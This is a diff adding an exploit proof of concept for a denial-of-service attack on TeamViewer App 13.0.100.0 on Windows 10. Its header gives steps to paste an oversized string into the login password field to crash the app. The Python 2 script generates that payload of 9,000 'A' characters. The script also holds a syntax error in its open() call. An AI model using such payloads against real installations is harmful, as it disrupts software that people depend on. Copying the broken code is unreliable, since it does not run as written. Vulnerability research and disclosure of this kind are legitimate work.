@@ -1,0 +1,28 @@
+# Exploit Title: TeamViewer App 13.0.100.0 - Denial of Service (PoC)
+# Exploit Author: Ali Alipour
+# WebSite: http://Alipour.it
+# Date: 2018-09-13
+# Vendor Homepage: https://www.teamviewer.com
+# Software Link Download:https://www.microsoft.com/en-us/p/teamviewer-remote-control/9wzdncrfj0rh?activetab=pivot%3aoverviewtab
+# Tested on: Windows 10 - 64-bit
+
+# Steps to Reproduce
+# Run the python exploit script, it will create a new 
+# file with the name "TeamViewer.txt" just copy the text inside "TeamViewer.txt"
+# and start the TeamViewer App 13.0.100.0 - In Microsoft Windows 10 . 
+# In The New Window Click On " Login " And Paste "Test@Test.Com" into Email Address Filed . 
+# Now Paste The Content Of "TeamViewer.txt" Into The Field: " Password ". 
+# Click "Sign in" And You Will See a [ Boom !!!! ] - TeamViewer App 13.0.100.0 - In Microsoft Windows 10 Crash.
+
+#!/usr/bin/python
+    
+buffer = "A" * 9000
+payload = buffer
+try:
+    f=open("TeamViewer.txt",22"w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
